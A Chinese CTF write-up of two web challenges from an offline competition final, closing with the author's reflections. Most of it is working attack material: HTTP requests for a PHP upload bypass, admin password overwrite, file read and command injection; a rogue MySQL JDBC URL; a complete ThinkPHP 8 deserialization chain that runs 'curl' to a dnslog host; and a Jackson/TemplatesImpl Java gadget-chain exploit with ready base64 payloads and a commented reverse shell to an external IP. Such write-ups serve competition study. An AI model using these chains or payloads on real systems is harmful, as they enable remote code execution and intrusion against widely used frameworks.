F4LlRlbXBsYXRlc0ltcGwJV0%2FBbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP%2F%2F%2F%2F91cgADW1tCS%2F0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAABmMr%2Bur4AAAA0ABsBAARldmlsBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAwADQoACwAOAQAEY2FsYwgAEAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABIAEwoACwAUAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAFgEABjxpbml0PgwAGAAICgAXABkAIQACABcAAAAAAAIACAAHAAgAAQAJAAAAFgACAAAAAAAKuAAPEhG2ABVXsQAAAAAAAQAYAAgAAQAJAAAAEQABAAEAAAAFKrcAGrEAAAAAAAEABQAAAAIABnB0AAdQaGFudG9tcHcBAHhxAH4ADXEAfgANdAABYXg%3D

这道题我从比赛结束后当天晚上都开始研究了，一开始我是准备用fastjson2打，当时一直做到第二天凌晨很晚也没做出来，想到早上还得去上课于是就没有继续研究了

今天放学后就开始研究，现在又打到凌晨终于出来了

最后的时候犯蠢了，在代码调试的时候unserialize(serializedData);是可以出发calc的，但是我去题目的反序列化入口打就不行，后来才发现是自己忘记给payload url编码了

其实这两道web题都一点也不难，除了最后一道反序列化，其他的漏洞本不应该找不到的，即使代码量很多，当时决赛3小时真的很不应该找不到，这些时间我甚至没有认真去翻每一个页面，当时因为紧张，线下赛断网环境思绪很乱，静不下心来慢慢找，看到这种代码量巨大的附件，居然没有勇气去认真分析，自己放弃了，全程几乎都在浪费时间。

往期推荐

坏了坏了

2025年广西网络与信息安全职业技能竞赛WriteUP

Z0Scan设计与实现：通用插件与分布式扫描新思路

【相关分享】记一次edu小程序全站用户接管与多处越权

记一次edu的轻松Getshell

文稿 | Ph@nt0m

制作 | Xuan8a1

审发 | 隼目安全


```
POST /adminapi/upload/file HTTP/1.1Host: 192.168.2.27:8091token: c44e3426e73f3f7c1a7562ce1cacb962Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gWContent-Length: 198------WebKitFormBoundary7MA4YWxkTrZu0gWContent-Disposition: form-data; name="file"; filename="123.php"Content-Type: image/png<?php phpinfo();?>------WebKitFormBoundary7MA4YWxkTrZu0gW--
```



```
POST /adminapi/auth.admin/edit HTTP/1.1Host: 127.0.0.1:2998Content-Length: 247sec-ch-ua:version: 1.9.4sec-ch-ua-mobile: ?0User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36Content-Type: application/json;charset=UTF-8Accept: application/json, text/plain, */*sec-ch-ua-platform:""Origin: http://127.0.0.1:2998Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: http://127.0.0.1:2998/admin/permission/adminAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: http304ok=1; thinkphp_show_page_trace=0|0Connection: close{"id":1,"account":"admin","name":"admin","dept_id":[1],"jobs_id":[],"role_id":[],"avatar":"http://127.0.0.1:2998/resource/image/adminapi/default/avatar.png","password":"admin1","password_confirm":"admin1","disable":0,"multipoint_login":1,"root":1}
```



```
POST /adminapi/file/readHTTP/1.1Host: 127.0.0.1:2998Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: thinkphp_show_page_trace=0|0Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 17file=E:\test.txt
```



```
class ResourceRegister{ /** * 资源路由 * @var Resource */ protected$resource; /** * 是否注册过 * @var bool class Rule */ protected$registered=false; /** * 架构函数 * @access public * @param Resource $resource 资源路由 */ publicfunction__construct(Resource$resource) { $this->resource =$resource; } /** * 注册资源路由 * @access protected * @returnvoid */ protectedfunctionregister() { $this->registered =true; $this->resource->parseGroupRule($this->resource->getRule()); } /** * 动态方法 * @access public * @param string$method方法名 * @param array $args 调用参数 * @returnmixed */ publicfunction__call($method,$args) { returncall_user_func_array([$this->resource,$method],$args); } publicfunction__destruct() { if(!$this->registered) { $this->register(); } }}
```



```
// thinkrouteResource 继承自 RuleGroup// RuleGroup 继承自 Ruleabstract class Rule { protected$rule="1.2"; protected$option= ["var"=> ["1"=> new Pivot()]];}
```



```
class Validate{ /** * 自定义验证类型 * @var array */ protected$type= []; /** * 验证类型别名 * @var array */ protected$alias= [ '>'=>'gt','>='=>'egt','<'=>'lt','<='=>'elt','='=>'eq','same'=>'eq', ]; /** * 当前验证规则 * @var array */ protected$rule= []; /** * 验证提示信息 * @var array */ protected$message= []; /** * 验证字段描述 * @var array */ protected$field= []; /** * 默认规则提示 * @var array */ protected$typeMsg= [ 'require' =>':attribute require', 'must' =>':attribute must', 'number' =>':attribute must be numeric', 'integer' =>':attribute must be integer', 'float' =>':attribute must be float', 'string' =>':attribute must be string', 'boolean' =>':attribute must be bool', 'email' =>':attribute not a valid email address', 'mobile' =>':attribute not a valid mobile', 'array' =>':attribute must be a array', 'accepted' =>':attribute must be yes,on or 1', 'date' =>':attribute not a valid datetime', 'file' =>':attribute not a valid file', 'image' =>':attribute not a valid image', 'alpha' =>':attribute must be alpha', 'alphaNum' =>':attribute must be alpha-numeric', 'alphaDash' =>':attribute must be alpha-numeric, dash, underscore', 'activeUrl' =>':attribute not a valid domain or ip', 'chs' =>':attribute must be chinese', 'chsAlpha' =>':attribute must be chinese or alpha', 'chsAlphaNum'=>':attribute must be chinese,alpha-numeric', 'chsDash' =>':attribute must be chinese,alpha-numeric,underscore, dash', 'url' =>':attribute not a valid url', 'ip' =>':attribute not a valid ip', 'dateFormat' =>':attribute must be dateFormat of :rule', 'in' =>':attribute must be in :rule', 'notIn' =>':attribute be notin :rule', 'between' =>':attribute must between :1 - :2', 'notBetween' =>':attribute not between :1 - :2', 'length' =>'size of :attribute must be :rule', 'max' =>'max size of :attribute must be :rule', 'min' =>'min size of :attribute must be :rule', 'after' =>':attribute cannot be less than :rule', 'before' =>':attribute cannot exceed :rule', 'expire' =>':attribute not within :rule', 'allowIp' =>'access IP is not allowed', 'denyIp' =>'access IP denied', 'confirm' =>':attribute out of accord with :2', 'different' =>':attribute cannot be same with :2', 'egt' =>':attribute must greater than or equal :rule', 'gt' =>':attribute must greater than :rule', 'elt' =>':attribute must less than or equal :rule', 'lt' =>':attribute must less than :rule', 'eq' =>':attribute must equal :rule', 'unique' =>':attribute has exists', 'regex' =>':attribute not conform to the rules', 'method' =>'invalid Request method', 'token' =>'invalid token', 'fileSize' =>'filesize not match', 'fileExt' =>'extensions to upload is not allowed', 'fileMime' =>'mimetype to upload is not allowed', 'startWith' =>':attribute must start with :rule', 'endWith' =>':attribute must end with :rule', 'contain' =>':attribute must contain :rule', ]; /** * 当前验证场景 * @var string */ protected$currentScene; /** * 内置正则验证规则 * @var array */ protected$defaultRegex= [ 'alpha' =>'/^[A-Za-z]+$/', 'alphaNum' =>'/^[A-Za-z0-9]+$/', 'alphaDash' =>'/^[A-Za-z0-9-_]+$/', 'chs' =>'/^[p{Han}]+$/u', 'chsAlpha' =>'/^[p{Han}a-zA-Z]+$/u', 'chsAlphaNum'=>'/^[p{Han}a-zA-Z0-9]+$/u', 'chsDash' =>'/^[p{Han}a-zA-Z0-9_-]+$/u', 'mobile' =>'/^1[3-9]d{9}$/', 'idCard' =>'/(^[1-9]d{5}(18|19|([23]d))d{2}((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)d{3}[0-9Xx]$)|(^[1-9]d{5}d{2}((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)d{3}$)/', 'zip' =>'/d{6}/', ]; /** * Filter_var 规则 * @var array */ protected$filter= [ 'email' => FILTER_VALIDATE_EMAIL, 'ip' => [FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_IPV6], 'integer'=> FILTER_VALIDATE_INT, 'url' => FILTER_VALIDATE_URL, 'macAddr'=> FILTER_VALIDATE_MAC, 'float' => FILTER_VALIDATE_FLOAT, ]; /** * 验证场景定义 * @var array */ protected$scene= [];因此可以劫持hidden映射给systemclass Validate { protected$type= ["hidden"=>"system"];}
```



```
namespace SymfonyComponentVarDumperCaster;class ConstStub extends Stub { public$value="cat /flag";}
```



```
<?php// +----------------------------------------------------------------------+// | ThinkPHP 8 反序列化POP链利用代码// | 利用入口: /api/login/get_account (Cookie: account=...)// +----------------------------------------------------------------------+// ===== 第一阶段：Symfony VarDumper组件（命令存储） =====namespace SymfonyComponentVarDumperCloner { class Stub { public$value='curl kd35jg.dnslog.cn'; public$type= 5; }}namespace SymfonyComponentVarDumperCaster { use SymfonyComponentVarDumperClonerStub; class ConstStub extends Stub {} // 继承Stub以传递命令}// ===== 第二阶段：ThinkPHP验证器（函数劫持） =====namespace think { use SymfonyComponentVarDumperCasterConstStub; class Validate { protected$type= []; // 关键：验证类型映射表 publicfunction__construct() { // 将"hidden"验证类型劫持到system函数 $this->type= ["hidden"=>"system"]; } } abstract class Model { protected$append= []; // 触发属性追加 protected$relation= []; // 绑定验证器 protected$hidden= []; // 存储命令对象 publicfunction__construct() { // 构造三角关系：append -> hidden -> relation $this->hidden = ["pwn"=> new ConstStub()]; //"pwn"是触发属性名 $this->append = ["pwn"=> []]; // 触发对"pwn"属性的访问 $this->relation = ["pwn"=> new Validate()]; // 访问时调用Validate验证器 } }}// ===== 第三阶段：ThinkPHP模型（触发载体） =====namespace thinkmodel { use thinkModel; class Pivot extends Model {} // 具体模型类，继承Model的触发逻辑}// ===== 第四阶段：ThinkPHP路由（入口包装） =====namespace thinkroute { use thinkmodelPivot; abstract class Rule { protected$rule="1.2"; protected$option= []; // 路由参数，存放Pivot对象 publicfunction__construct() { // 将Pivot对象埋入路由参数中 $this->option = ["var"=> ["1"=> new Pivot()]]; } } class RuleGroup extends Rule { publicfunction__construct() { parent::__construct(); } } class Resource extends RuleGroup {} // 具体路由规则类 class ResourceRegister { protected$resource; // 启动链的入口属性 publicfunction__construct() { $this->resource = new Resource(); // 包装Resource对象 } }}namespace { $entry= new thinkrouteResourceRegister(); $payload= base64_encode(serialize($entry)); echo"生成的Payload:n"; echo$payload."nn"; echo"利用方式:n"; echo"GET /api/login/get_account HTTP/1.1n"; echo"Host: target.comn"; echo"Cookie: account=".$payload."n";}
```



```
GET /init/template?file=C:/Users/attac/Downloads/192.168.20.128/202511190920/1.txt&target=C:/Users/attac/Downloads/192.168.20.128/202511190920/static/ HTTP/1.1Host: localhost:8080sec-ch-ua:sec-ch-ua-mobile: ?0sec-ch-ua-platform:""Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close
```



```
POST /blog/api/filelist HTTP/1.1Host: localhost:8080sec-ch-ua:sec-ch-ua-mobile: ?0sec-ch-ua-platform:""Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 12path=|whoami
```



```
http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/https://www.vesiluoma.com/abusing-mysql-clients/
```



```
POST /database/testConnection HTTP/1.1Host: localhost:8080Content-Type: application/jsonContent-Length: 235{"dbDriver":"com.mysql.cj.jdbc.Driver","dbUrl":"jdbc:mysql://{服务器ip}:3306/fake_db?allowLoadLocalInfile=true&allowUrlInLocalInfile=true&allowLoadLocalInfileInPath=/","dbUsername":"caonima","dbPassword":"hack"}
```



```
@PostMapping({"/backdoor"})public void backdoor(String data) throws Exception { this.commentService.deserialize(data);}private void completeComment(BizComment comment) {HttpServletRequest request = ((ServletRequestAttributes)RequestContextHolder.getRequestAttributes()).getRequest();User user = (User)SecurityUtils.getSubject().getPrincipal();comment.setUserId(user.getUserId());comment.setNickname(user.getNickname());comment.setEmail(user.getEmail());comment.setAvatar(user.getImg());comment.setIp(IpUtil.getIpAddr(request));comment.setStatus(CoreConst.STATUS_VALID);}public CommentController(final BizCommentService commentService) { this.commentService = commentService;}}
```



```
//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//package com.puboot.module.admin.service.impl;import com.baomidou.mybatisplus.core.metadata.IPage;import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;import com.puboot.common.util.Pagination;import com.puboot.module.admin.mapper.BizCommentMapper;import com.puboot.module.admin.model.BizComment;import com.puboot.module.admin.service.BizCommentService;import com.puboot.module.admin.vo.CommentConditionVo;import java.io.ByteArrayInputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectStreamClass;import java.util.Base64;import java.util.HashMap;import org.springframework.stereotype.Service;@Servicepublic class BizCommentServiceImpl extends ServiceImpl<BizCommentMapper, BizComment> implements BizCommentService { private final BizCommentMapper commentMapper; public IPage<BizComment> selectComments(CommentConditionVo vo, Integer pageNumber, Integer pageSize) { IPage<BizComment> page = new Pagination((long)pageNumber, (long)pageSize); page.setRecords(this.commentMapper.selectComments(page, vo)); returnpage; } public int deleteBatch(Integer[] ids) { returnthis.commentMapper.deleteBatch(ids); } public Object deserialize(String data) throws IOException { if(data == null) { throw new IOException("data is null"); }else{ byte[] decode; try { decode = Base64.getDecoder().decode(data); } catch (IllegalArgumentException var36) { IllegalArgumentException e = var36; throw new IOException("Base64 decode failed", e); } ByteArrayInputStream bais = new ByteArrayInputStream(decode); Throwable var4 = null; Object e; try { ObjectInputStream ois = new ObjectInputStream(bais) { boolean check =false; protected Class resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { Class<?> targetc = super.resolveClass(desc); if(!this.check && !HashMap.class.isAssignableFrom(targetc)) { throw new IllegalArgumentException("HackerClass:"+ targetc); }else{ this.check =true; returntargetc; } } }; Throwable var6 = null; try { try { e = ois.readObject(); } catch (ClassNotFoundException var34) { e = var34; throw new RuntimeException((Throwable)e); } } catch (Throwable var35) { e = var35; var6 = var35; throw var35; } finally { if(ois != null) { if(var6 != null) { try { ois.close(); } catch (Throwable var33) { var6.addSuppressed(var33); } }else{ ois.close(); } } } } catch (Throwable var38) { var4 = var38; throw var38; } finally { if(bais != null) { if(var4 != null) { try { bais.close(); } catch (Throwable var32) { var4.addSuppressed(var32); } }else{ bais.close(); } } } returne; } } public BizCommentServiceImpl(final BizCommentMapper commentMapper) { this.commentMapper = commentMapper; }}
```



```
https://github.com/FasterXML/jackson-databind/issues/2986https://zhuanlan.zhihu.com/p/1923706452289225199
```



```
/*HashMap.readObejct() HashMap.hashcode() ObjectIdGenerator.IdKey.equals() XString.equals() POJONode.toString()*/
```



```
HashMap::readObject() ↓HashMap::putVal() ↓ HashMap::hash() ↓ObjectIdGenerator$IdKey::hashCode() ↓POJONode::hashCode() ↓ POJONode::toString() ↓POJONode::serialize() ↓BeanSerializer::serialize() ↓BeanSerializer::serializeFields() ↓BeanPropertyWriter::serializeAsField() ↓MethodProperty::get() ↓TemplatesImpl::getOutputProperties() ↓TemplatesImpl::newTransformer() ↓TemplatesImpl::getTransletInstance() ↓TransletClassLoader::defineClass() ↓恶意类::<clinit>() ↓Runtime::exec()
```



```
import com.fasterxml.jackson.annotation.ObjectIdGenerator;import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.org.apache.xpath.internal.objects.XString;import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import javassist.CtMethod;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.URLEncoder;import java.util.Base64;import java.util.HashMap;public class exp { public static void main(String[] args) throws Exception { CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode"); CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace"); ctClass.removeMethod(writeReplace); ctClass.toClass(); TemplatesImpl tmp = new TemplatesImpl(); setValue(tmp,"_tfactory", new TransformerFactoryImpl()); setValue(tmp,"_name","Phantom"); setValue(tmp,"_bytecodes", generateEvilBytes()); POJONode pojoNode = new POJONode(tmp); ObjectIdGenerator.IdKey idkey1 = new ObjectIdGenerator.IdKey(Object.class, Object.class, new XString("")); ObjectIdGenerator.IdKey idkey2 = new ObjectIdGenerator.IdKey(Object.class, Object.class, pojoNode); setFieldValue(idkey1,"hashCode", 0); setFieldValue(idkey2,"hashCode", 2); HashMap<Object, Object> hashMap = new HashMap<Object, Object>(); hashMap.put(idkey1,"x"); hashMap.put(idkey2,"a"); setFieldValue(idkey2,"hashCode", 0); byte[] serializedData = serialize(hashMap); String base64Payload = Base64.getEncoder().encodeToString(serializedData); String urlEncodedPayload = URLEncoder.encode(base64Payload,"UTF-8"); System.out.println("Base64 Payload:"); System.out.println(base64Payload); System.out.println("nURL Encoded Payload:"); System.out.println(urlEncodedPayload); // unserialize(serializedData); } public static byte[] serialize(Object obj) throws Exception { ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream objo = new ObjectOutputStream(baos); objo.writeObject(obj); objo.close(); returnbaos.toByteArray(); } public static void unserialize(byte[] string) throws Exception { ByteArrayInputStream bais = new ByteArrayInputStream(string); ObjectInputStream obji = new ObjectInputStream(bais); obji.readObject(); obji.close(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static byte[][] generateEvilBytes() throws Exception { ClassPool cp = ClassPool.getDefault(); cp.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = cp.makeClass("evil"); String cmd ="java.lang.Runtime.getRuntime().exec("calc");"; // String cmd ="java.lang.Runtime.getRuntime().exec("sh -i >& /dev/tcp/154.201.70.35/8080 0>&1");"; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(cp.get(AbstractTranslet.class.getName())); returnnew byte[][]{cc.toBytecode()}; } public static <T> void setValue(Object obj, String fname, T f) throws Exception { Field filed = TemplatesImpl.class.getDeclaredField(fname); filed.setAccessible(true); filed.set(obj, f); }}// Base64 Payload:// rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACc3IAOGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5hbm5vdGF0aW9uLk9iamVjdElkR2VuZXJhdG9yJElkS2V5AAAAAAAAAAECAARJAAhoYXNoQ29kZUwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wABXNjb3BldAARTGphdmEvbGFuZy9DbGFzcztMAAR0eXBlcQB+AAR4cAAAAABzcgAxY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLm9iamVjdHMuWFN0cmluZxwKJztIFsX9AgAAeHIAMWNvbS5zdW4ub3JnLmFwYWNoZS54cGF0aC5pbnRlcm5hbC5vYmplY3RzLlhPYmplY3T0mBIJu3u2GQIAAUwABW1fb2JqcQB+AAN4cgAsY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLkV4cHJlc3Npb24H2aYcjays1gIAAUwACG1fcGFyZW50dAAyTGNvbS9zdW4vb3JnL2FwYWNoZS94cGF0aC9pbnRlcm5hbC9FeHByZXNzaW9uTm9kZTt4cHB0AAB2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHBxAH4ADXQAAXhzcQB+AAIAAAAAc3IALGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlBPSk9Ob2RlAAAAAAAAAAICAAFMAAZfdmFsdWVxAH4AA3hyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAABmMr+ur4AAAA0ABsBAARldmlsBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAwADQoACwAOAQAEY2FsYwgAEAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABIAEwoACwAUAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAFgEABjxpbml0PgwAGAAICgAXABkAIQACABcAAAAAAAIACAAHAAgAAQAJAAAAFgACAAAAAAAKuAAPEhG2ABVXsQAAAAAAAQAYAAgAAQAJAAAAEQABAAEAAAAFKrcAGrEAAAAAAAEABQAAAAIABnB0AAdQaGFudG9tcHcBAHhxAH4ADXEAfgANdAABYXg=// URL Encoded Payload:// rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACc3IAOGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5hbm5vdGF0aW9uLk9iamVjdElkR2VuZXJhdG9yJElkS2V5AAAAAAAAAAECAARJAAhoYXNoQ29kZUwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wABXNjb3BldAARTGphdmEvbGFuZy9DbGFzcztMAAR0eXBlcQB%2BAAR4cAAAAABzcgAxY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLm9iamVjdHMuWFN0cmluZxwKJztIFsX9AgAAeHIAMWNvbS5zdW4ub3JnLmFwYWNoZS54cGF0aC5pbnRlcm5hbC5vYmplY3RzLlhPYmplY3T0mBIJu3u2GQIAAUwABW1fb2JqcQB%2BAAN4cgAsY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLkV4cHJlc3Npb24H2aYcjays1gIAAUwACG1fcGFyZW50dAAyTGNvbS9zdW4vb3JnL2FwYWNoZS94cGF0aC9pbnRlcm5hbC9FeHByZXNzaW9uTm9kZTt4cHB0AAB2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHBxAH4ADXQAAXhzcQB%2BAAIAAAAAc3IALGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlBPSk9Ob2RlAAAAAAAAAAICAAFMAAZfdmFsdWVxAH4AA3hyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0%2FBbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP%2F%2F%2F%2F91cgADW1tCS%2F0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAABmMr%2Bur4AAAA0ABsBAARldmlsBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAwADQoACwAOAQAEY2FsYwgAEAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABIAEwoACwAUAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAFgEABjxpbml0PgwAGAAICgAXABkAIQACABcAAAAAAAIACAAHAAgAAQAJAAAAFgACAAAAAAAKuAAPEhG2ABVXsQAAAAAAAQAYAAgAAQAJAAAAEQABAAEAAAAFKrcAGrEAAAAAAAEABQAAAAIABnB0AAdQaGFudG9tcHcBAHhxAH4ADXEAfgANdAABYXg%3D
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763727668-wxsync-2025-11-5adc246a15344c0fd5bc513751cda125.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763727670-wxsync-2025-11-9d237780df7780b3022ae1600823f728.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763727673-wxsync-2025-11-ccd58788d56f1878e3065ba8c7da0d9a.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763727678-wxsync-2025-11-3da19d0d2bd5c0d2f170d316f477fd27.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763727680-wxsync-2025-11-cc69599d7d1e99fa3a3fec2bcf206fc7.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763727683-wxsync-2025-11-0b0afb68579c3fe631e77dc4f5ad4707.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763727686-wxsync-2025-11-fdc940972e985c6b082eae61568f8f78.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763727688-wxsync-2025-11-05c24461d860714adbd99677e15442af.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763727691-wxsync-2025-11-b9bb020de6ec7e01b975c0cf13a27d39.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763727693-wxsync-2025-11-0a434723ab749a9b236479a36fdc17a0.png)